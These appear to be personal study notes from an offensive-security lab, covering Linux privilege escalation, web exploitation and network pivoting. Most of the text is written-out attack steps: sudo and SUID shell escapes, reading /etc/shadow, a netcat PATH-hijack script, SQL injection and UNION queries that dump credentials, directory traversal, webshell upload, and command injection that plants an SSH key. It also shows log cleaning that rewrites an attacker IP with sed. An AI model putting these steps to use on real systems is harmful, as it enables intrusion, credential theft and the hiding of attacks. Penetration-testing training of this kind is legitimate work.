## demo for linux exploitation

    check what you can run:
        sudo -l 
    we see that we can run apt-get
        run that against GTFOBins
    it shows us it can be used to get a shell:
        sudo apt-get changelog apt -> !/bin/sh to get ya shell.
    whoami -> root
    id -> uid=o (root) gid=0(root) groups=0(root)

    **demo 2**
    sudo -l -> (root) NOPASSWD: /bin/cat /var/log/syslog*
    so we can:
        ls /var/log/syslog
    in order to see log files. -> BUT because there was an asterisk.. run 
        sudo cat /var/log/syslog.1 /etc/shadow

    **demo 3**
    find / -type f -perm /4000 -ls 2>/dev/null (find files with SUID bit)
    look through these, and cross reference with GTFO bins
    we find /usr/bin/nice 
    and GTFO bins tells us to run it and give ourself a shell.
    -> nice /bin/sh -p
    BAM SHELL

    **Demo 4**
    cd into /tmp
    make a script.
    nano ls
    #!/bin/bash -e /bin/bash
    nc 127.0.0.1 3333

    chmod it. chmod +x ls
    **create a netcat listener** on another terminal
    nc -lvp 3333 
    **run script**
    **ls has been replaced with a script, to actually run the command, /bin/ls**
    

    
    ghjcnbnenrf      (zeus)
        
        
    
    

## Log cleaning example question.

        In order to receive credit for this challenge you must provide the md5sum of the auth.log after it has been cleaned.

    There are log entries from the network you pivoted from.
    The user name is 'billybob'
    You don’t know the exact IP address but you know the network is a 172.16.0.0/16

        cat auth.log | grep 172
        egrep -v '21:51:32|10:02:15' auth.log > auth.lame
        sed -i 's/172.16.34.4/192.168.1.103/g' auth.lame

    
        
    
    
## Dry run notes:
    
    - nmap starting IP address.
        nmap -Pn -T4 *start ip*
    - we noticed port 22 and 80 open.
        nmap -Pn -T4 --script=banner,http-enum.nse *start ip*
        do this to ensure ports are what they say they are, and enumerate http.
    - port 80 was open, so we'll open Firefox and navigate to that site.
        first thing on new site, scroll up and down and click on stuff.
        open everything in new tabs. 
        we see three different links, they all lead to the same page.
        we notice an input box where we can exploit.
        we notice a box where we can upload a file. (malicious php file)
        we notice a user login page.
        we saw the scripts directory from our nmap script. -> click on that and find creds.
    - we saw that we could click on the login box. use sql injection like bob' or 1='1
        to see info.
            open developer console, capture the traffic. change the post request to raw, add a question mark after the php, paste the raw request after it. then view page source.
    - decode encoded passwords using Cyberchef
    - if you see file to read, think DIRECTORY TRAVERSAL
        go back to the input box, and check ../../../../etc/hosts, /etc/passwd etc.
    - in /etc/hosts -> we see the IP address to what we can assume is the next pivot.
    - use creds you found to SSH into the back end of the start ip.
    - Once you get on a box, things you should do ->
        cat /etc/hosts, /etc/passwd etc. | ip neigh | ruby pingsweep
    - used ping sweep and found two ip's we could reach from that machine.
        so create a dynamic, and nmap those ip's you found.
    - results of nmap scan returned port 22,80 open on one of the ip's
        and returned 22 on another.
        if you see port 80 open, use the http enum script.
    - create your tunnels to reach the ports on these machines.
        close your dynamic. 
        create your port forwards to those ip's / ports.
    - check out whatever's being hosted on that port 80. 
        its a SQL server! with options you can check.
        when you get on one of these, start to "fuzz"
        pick.php?product=1 OR 1=1; (do this on all of them) we find #7 is vulnerable.
        once you find the vulnerable one, use something like
        product=7 union select 1,2,3; 
        move on to golden statement.
        product=7 union select table_schema,column_name,table_name from information_schema.columns
        three defaults to ignore: information_schema, mysql, performance_schema.
        dump specific: UNION SELECT name,username,user_id FROM siteusers.users;
        this returns login credentials.
        you might see something that says -> what date was this thing purchased?
    - attempt to ssh to the next box that we saw above using creds found on SQL server.
        use ruby ping sweep again to scan the same network from that box to see if that box can see something the other box couldn't.
    **the round sensor box wanted us to privilege escalate**
        we run sudo -l, and we can run /usr/bin/find. 
        check GTFObins and see what we can do with find.
        copy the sudo find priv esc thing from gtfobins and run it. escalated.
    - we created another dynamic and nmap scan the next box. its a windows box with 3389/9999 open.
        we banner grab 9999 port, and see that its secure server.
    - go ahead and open tunnels to the ports that you think you're going to need.
        9999, 3389 etc.
        Because 9999 is open, we can use our overflow script that we created previously.
        because we've used this before, we'll have to change the IP / port that we're sending it to. It'll be through our loopback on whatever tunnel we connected to 9999.

## Review

    **authentication bypass**
        if you see login fields, attempt to bypass. bob' OR 1='1 -> login -> inspect -> network, reload page and click on the post, get the raw request -> add a ? to the end of php, then paste that raw request behind it.

    **malicious file upload**
        check robots.txt (don't forget http enum scan -> nmap -Pn -sT --script=http-enum.nse *targ ip*) this scan will show you robots.txt or uploads or something. that script shows WEB DIRECTORIES.
        - we found the uploads folder. You need a place to upload, you need the file to upload(webshell.php in downloads), and need a vulnerable server to accept it, and a way to find it. (uploads web directory)
        - go to the uploads folder, then click on your executable, then you've got a shell.

    **command injection** (input field that lets you enter something "system to ping" ex.
        - ex: input field wanted us to ping an ip, so we do "127.0.0.1 ; whoami" or you can just start with a semi colon, then run your command after it. ex: ; whoami
        - if you come across multiple on the same page, test all of them.

    **SSH key upload**
        - cd .ssh , then ls 
        - file id_rsa | id_rsa.pub to verify what they are.
        - pubic key is the one that gets uploaded.
        - cat id_rsa.pub (copy all of it)
        - go back to your input field -> ; whoami (www-data) 
        - cat /etc/passwd to find the users home directory.
        - go back to the input field. -> ; ls -lisa /var/www -> mkdir /var/www/.ssh -> run ls command again.
        - then ; echo "" > /var/www/.ssh/authorized_keys (put your public key between the quotes).
        - then ; cat /var/www/.ssh/authorized_keys (to make sure it uploaded)
        - then ssh into the box. ssh -i id_rsa www-data@10.50.32.44
        **you might find a private key hidden in a directory somewhere** if you do, save this key and name it something, go to that directory, then use the ssh -i command to ssh in as that user (with their username)

    **exe replacement**
        - try to rename, create a file etc.

    **post ex**
         - check /etc/crontab, /var/spool
         - /etc/shadow, /etc/passwd, /etc/hosts

    **priv esc**
        - sudo -l
        - check GTFObins for vulnerable stuff. Also check SUID / SGID stuff.

    **remote logging (rsyslog)**
        - /etc/rsyslog.d/* | /etc/rsyslog.conf 

    **binary analysis, reverse engineering, RE**
        - we get a file, need to figure out how it works. run 'file' on it. if you see ELF, think linux.
        - behavioural analysis, figure out how it takes information. ./func <<< $(echo "assdflsk")
        - we don't always need the carrots, carrots send it as user input.
        - gdb ./func -> run
        - GDB to disassemble and look at linux binaries. (if you see GDB, dissassemble a binary)
        - pdisass main (to look at main function) or disass if you don't have peda.
        - we see a function, pdisass 'name of function' to see it.
        - red is a vulnerable function! google name of function + buffer overflow vulnerability

    **windows persistence**
        - registry
        - schtasks (task scheduler)
        - services

    
        

    
        
    
        
    
        
    
    
        
    
    
        
        

    
    
    
    

    
    

    
    
    
    
    

        
        
        
        
            
        
    


            

        

    
    
    
    
    
    
    
    

    
    
        
        

    
    
    

    
    
    
    
    

    
    
    
    



    
    
    
    

    
        
        
        
        
        
            

    

    

    
        
    
    
    
    

    
    
    
    
    
    
    
    

    

    
    
    

    
    
        
        
    

    
    

    
            

        
        

    
    

    

    
        
    
    
        
        
    

    

    

    
